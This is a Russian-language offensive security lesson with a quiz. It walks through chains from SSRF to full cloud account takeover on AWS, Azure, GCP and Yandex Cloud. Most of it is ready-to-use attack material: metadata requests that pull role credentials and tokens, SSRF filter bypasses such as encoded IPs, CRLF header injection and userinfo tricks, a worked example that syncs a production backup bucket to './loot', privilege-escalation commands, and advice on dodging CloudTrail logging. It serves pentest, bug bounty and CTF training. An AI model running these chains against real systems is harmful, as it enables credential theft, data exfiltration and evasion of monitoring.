---
id: cloud-ssrf-to-cloud
title: "SSRF → захват облака: сквозные цепочки AWS/Azure/GCP"
category: cloud
parent: cloud-metadata-ssrf
difficulty: expert
order: 3
tags: [cloud, ssrf, metadata, imds, takeover, chain, aws, azure, gcp]
prerequisites: [cloud-metadata-ssrf, cloud-azure-managed-identity]
useful_for:
  - "Эксплуатация SSRF до полного захвата облачного аккаунта"
  - "Bug bounty: SSRF в облачных приложениях"
  - "Понимание отличий metadata между провайдерами"
estimated_minutes: 40
summary: "Сквозные цепочки SSRF до захвата роли/аккаунта: как отличать провайдеров, обходить защиту IMDS, и что делать с полученным токеном. Разбор AWS, Azure, GCP и Yandex Cloud."
---
## Зачем этот урок

SSRF сам по себе — не цель. Цель — **облачные креденшелы** на metadata-сервере. Одна SSRF в облачном приложении превращается в полный захват аккаунта. Здесь собраны сквозные цепочки для AWS, Azure, GCP и совместимых облаков, приёмы быстрого определения провайдера и инструменты, которыми превращают украденный токен в данные и эскалацию.

## Провайдер-фингерпринтинг: где вы находитесь

Все основные облака используют один и тот же link-local адрес `169.254.169.254`, но требуют разных заголовков и путей:

- **AWS**: `GET /latest/meta-data/` без заголовков — если 200, IMDSv1 открыт. `/latest/dynamic/instance-identity/document` содержит `accountId` и `region`.
- **Azure**: `/metadata/instance?api-version=2021-02-01` требует заголовок `Metadata: true`.
- **GCP**: `metadata.google.internal/computeMetadata/v1/` требует `Metadata-Flavor: Google`.
- **Yandex Cloud**: `/computeMetadata/v1/instance/` совместим с GCP (`Metadata-Flavor: Google`).
- **DigitalOcean**: `/metadata/v1.json` без заголовков.

Приём: при SSRF бейте по нескольким путям и смотрите, кто ответит 200. Ответ 401/403 на AWS-путь при 200 на GCP-путь однозначно говорит о GCP.

## Общая анатомия цепочки

Любая цепочка «SSRF → облако» проходит четыре фазы:
1. **Доступ** — SSRF/RCE, позволяющий делать исходящие запросы.
2. **Извлечение** — чтение metadata: имя роли/SA, затем креды/токен.
3. **Триаж** — определить, чьи это креды и какие у них права.
4. **Эскалация** — от прав роли к данным и, при возможности, к более широким правам.

## Цепочка AWS: полный разбор

IMDSv1 (прямой GET):

```
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
```

Ответ — JSON с `AccessKeyId`, `SecretAccessKey`, `Token`, `Expiration`. IMDSv2 требует PUT на `/latest/api/token` с заголовком `X-aws-ec2-metadata-token-ttl-seconds`, затем передачи токена заголовком `X-aws-ec2-metadata-token`. SSRF с контролем метода/заголовков обходит v2; иначе — ищем `gopher://` или ECS-endpoint (см. `cloud-ec2-ssrf`).

## Цепочка Azure

```
GET http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Header: Metadata: true
```

Возвращает `access_token` managed identity. Декодируйте JWT (payload base64) — увидите `oid`, `appid`, `roles`. Далее — `az rest` по subscriptions/roleAssignments или Key Vault (см. `cloud-azure-managed-identity`). Для других ресурсов меняйте `resource` (`https://vault.azure.net`, `https://graph.microsoft.com`).

## Цепочка GCP

```
GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google
```

Возвращает OAuth2 `access_token` сервисного аккаунта. Полезные пути: `.../project/attributes/` (часто SSH-ключи), `.../instance/service-accounts/default/scopes`, `.../instance/attributes/`. За один запрос с `?recursive=true` можно выгрузить всю metadata.

## Цепочка Yandex Cloud и совместимые

Yandex Cloud отдаёт metadata по GCP-совместимому пути с заголовком `Metadata-Flavor: Google`; сервисный аккаунт и его токен доступны по `/computeMetadata/v1/instance/service-accounts/default/token`. Аналогично устроены многие совместимые платформы — сначала пробуйте оба заголовка.

## Обход защит SSRF

- **Заголовки.** Если SSRF позволяет задать заголовок — IMDSv2/Azure/GCP открываются; иногда заголовок протаскивается CRLF-инъекцией в URL.
- **Редиректы.** Приложение, следующее 3xx, перенаправляется на metadata-хост (open redirect + SSRF).
- **DNS rebinding.** Домен сначала резолвится в разрешённый IP (проходит allowlist), затем — в `169.254.169.254`.
- **Decimal/octal IP.** `http://2852039166/` или `http://0251.0376.0251.0376/` обходят наивные фильтры.
- **IPv6.** `http://[::ffff:169.254.169.254]/` иногда проходит.
- **Userinfo/Host trick.** `http://169.254.169.254:80@attacker/`, `http://attacker#@169.254.169.254/`.

## Что делать с полученным токеном

- **AWS**: `aws sts get-caller-identity`, `enumerate-iam`, `Pacu`, `ScoutSuite`, `cloudsplaining`.
- **Azure**: `az rest --method get --url https://management.azure.com/subscriptions?api-version=2020-01-01`, ROADtools (`roadrecon`), `az keyvault secret list`.
- **GCP**: `gcloud auth activate-service-account --access-token-file`, `gcloud projects list`, `gcloud iam service-accounts list`, gcpwn.

```bash
pip install enumerate-iam
enumerate-iam --access-key "$AWS_ACCESS_KEY_ID" --secret-key "$AWS_SECRET_ACCESS_KEY" --session-token "$AWS_SESSION_TOKEN"
```

## Разобранный пример: /proxy?url= → захват бакета

1. Приложение: `GET /proxy?url=<user_url>`.
2. `url=http://169.254.169.254/latest/meta-data/` → список путей.
3. `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` → имя роли `app-role`.
4. `url=.../app-role` → временные креды.
5. `export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...` и `aws sts get-caller-identity`.
6. `enumerate-iam` → роль читает бакет и может `iam:PassRole` + `lambda:CreateFunction`.
7. `aws s3 sync s3://prod-backups ./loot`.
8. Эскалация через `PassRole` (см. `cloud-lambda-privesc`).

## OPSEC и детект

Обращения к metadata не логируются в CloudTrail (это локальный HTTP), но последующее использование кредов — да: `GetCallerIdentity`, `ListBuckets`, `AssumeRole` видны. Действуйте минимально, не сканируйте весь регион. На стороне защиты — IMDSv2 required, hop limit 1, блокировка 169.254.169.254 из приложений, детект SSRF.

## Частые ошибки

- **Сдаться на IMDSv2.** SSRF с PUT/заголовками или ECS-endpoint обходит.
- **Не проверять все провайдеры.** Хост в Azure, а пробуете AWS-путь.
- **Забыть `recursive=true` в GCP.** Один запрос отдаёт всю metadata.
- **Не сохранять токен.** Он живёт часами; сохраните и не повторяйте SSRF.
- **Игнорировать `Expiration`.** AWS-креды истекают — работайте быстро или обновите.

## Что делать дальше / решение

Практика: поднимите учебное приложение с SSRF в облаке, определите провайдера, извлеките креды, прогоните `enumerate-iam`, найдите бакет. Дальше — `cloud-ec2-ssrf` (IMDSv2/ECS), `cloud-privesc-iam` (эскалация) и `cloud-assume-role` (cross-account).

## Триаж токена: что смотреть первым

Получив токен, не спешите с эксплуатацией. Сначала триаж: (1) `aws sts get-caller-identity` — чей это аккаунт и роль; (2) срок действия из `Expiration`; (3) права роли через `list-attached-role-policies` и `list-role-policies`; (4) границы (permissions boundary, SCP). Только после этого стройте цепочку. Триаж экономит время и снижает шум в логах.

## AWS: конкретные команды эскалации

```bash
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name <R>
aws iam get-policy-version --policy-arn <ARN> --version-id v1
aws s3 ls
aws secretsmanager list-secrets
aws ssm describe-parameters
```

Если есть `iam:PassRole` + `lambda:CreateFunction` — создаём функцию под более привилегированной ролью и вызываем. Если `iam:CreateAccessKey` на другого пользователя — выпускаем долгоживущий ключ. Если `sts:AssumeRole` в другую роль — ходим по цепочке.

## Azure: от токена MI к подпискам

С украденным `access_token` managed identity:

```bash
az rest --method get --url "https://management.azure.com/subscriptions?api-version=2020-01-01"
az rest --method get --url "https://management.azure.com/subscriptions/<SUB>/resourceGroups?api-version=2021-04-01"
az keyvault secret list --vault-name <KV> --subscription <SUB>
```

Декодируйте JWT: claims `oid` (object id), `appid` (client id), `roles` (RBAC-роли). ROADtools (`roadrecon gather`) помогает разобрать Entra ID, если прав достаточно.

## GCP: от access_token к данным

```bash
TOKEN=<access_token>
curl -H "Authorization: Bearer $TOKEN" "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN"
curl -H "Authorization: Bearer $TOKEN" "https://cloudresourcemanager.googleapis.com/v1/projects"
gcloud auth activate-service-account --access-token-file=<(echo "$TOKEN")
gcloud iam service-accounts list
gcloud storage ls
```

Часто сервисный аккаунт имеет доступ к бакетам и секретам. Ищите `roles/editor` и `roles/owner` — это широкие права.

## Реальные CTF-примеры

Типовой сценарий Cloud-CTF: SSRF в веб-приложении → `iam/security-credentials/` → роль с доступом к бакету → флаг в бакете. Более сложный: роль без S3, но с `ssm:GetParameter` → секрет → ключ другого пользователя → эскалация. Ключ к решению — триаж прав на каждом шаге и построение цепочки.

## OPSEC при эксплуатации

Каждый API-вызов логируется в CloudTrail. Избегайте массовых `describe-*`, не сканируйте регионы. Отдавайте предпочтение точечным вызовам и используйте креды роли инстанса, а не создавайте новые сущности без нужды. Для скрытности можно работать в регионе, где логирование отключено (см. `cloud-cloudtrail-evasion`).

## Azure/GCP: расширенный триаж токена

Для Azure managed identity декодируйте JWT и проверьте `roles` и `oid`. Для GCP `tokeninfo` покажет `scope` и `email` сервисного аккаунта. Затем постройте список ресурсов: подписки (Azure), проекты (GCP), бакеты, секреты. Инструменты: ROADtools для Entra ID, gcpwn для GCP.

## Скрытая экспансия и детект

Обращения к metadata локальны и не логируются, но использование кредов — логируется. Действуйте точечно. Для защитников: IMDSv2 required, hop limit 1, блокировка 169.254.169.254, детект аномальных `GetCallerIdentity` и выдачи токенов.

## Практический вывод

Цепочка «SSRF → metadata → креды → данные» — самый частый путь от веб-бага к облаку. Ключ к успеху — быстрый триаж прав и аккуратная экспансия без шума.

## Квиз

```quiz
- question: "Какой заголовок нужен для получения токена managed identity в Azure через metadata?"
  options:
    - "Metadata-Flavor: Google"
    - "Metadata: true"
    - "X-aws-ec2-metadata-token"
    - "Authorization: Bearer"
  answer: 1
  explanation: "Azure IMDS требует Metadata: true."
- question: "Как обойти IMDSv2 при SSRF?"
  options:
    - "Никак"
    - "Если SSRF позволяет PUT-запрос и произвольные заголовки — сначала получаем токен через PUT /latest/api/token"
    - "Отключить IMDSv2 на сервере"
    - "Использовать HTTPS"
  answer: 1
  explanation: "IMDSv2 защищает от простого SSRF, но SSRF с методом/заголовками его обходит."
- question: "Какая форма записи IP обходит простые строковые фильтры на 169.254.169.254?"
  options:
    - "127.0.0.1"
    - "Decimal-форма 2852039166 или octal 0251.0376.0251.0376"
    - "10.0.0.1"
    - "0.0.0.0"
  answer: 1
  explanation: "Альтернативные представления IP часто не покрыты наивными фильтрами."
- question: "Что такое DNS rebinding в контексте SSRF?"
  options:
    - "Атака на TLS"
    - "Домен сначала резолвится в разрешённый IP, затем — в 169.254.169.254, обходя allowlist"
    - "Перебор паролей"
    - "Инъекция SQL"
  answer: 1
  explanation: "Смена ответа DNS между проверкой и запросом обходит проверку по домену."
- question: "Что первым делом делать с полученными облачными кредами из metadata?"
  options:
    - "Удалить их"
    - "Проверить личность (get-caller-identity) и перечислить права"
    - "Опубликовать в интернете"
    - "Сменить пароль"
  answer: 1
  explanation: "Сначала понять, кто вы и что можете, затем действовать."
```

## Где пригодится

- **Bug bounty** — SSRF в облачных приложениях, самые дорогие отчёты.
- **Пентест** — сквозная цепочка от веб-бага до облака.
- **CTF** — категории Cloud и Web пересекаются здесь.
- **IR/Blue team** — детект обращений к metadata и кражи токенов.
- **DevSecOps** — требование IMDSv2, блокировка metadata на уровне сети.
